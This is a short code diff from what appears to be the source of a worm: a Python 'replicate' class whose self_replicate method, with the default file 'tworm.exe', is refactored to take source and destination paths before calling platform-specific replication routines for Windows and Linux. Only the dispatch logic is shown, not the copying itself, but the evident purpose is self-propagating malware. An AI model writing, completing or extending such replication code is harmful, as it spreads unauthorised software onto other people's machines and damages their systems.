@@ -14,13 +14,13 @@ class replicate:
     def getfiledata(self):
         return self.data
     
-    def self_replicate(self, target="windows", path="tworm.exe"):
+    def self_replicate(self, target="windows", source_path="tworm.exe", dest_path=""):
         print("start")
         try:
             if "windows" in target.lower():
-                self.replicate_on_windows(path)
+                self.replicate_on_windows(source_path, dest_path)
             elif "linux" in target.lower():
-                self.replicate_on_linux(path)
+                self.replicate_on_linux(source_path,dest_path )
             else:
                 print("replicate failed - platform unidentify")
         except Exception as e:
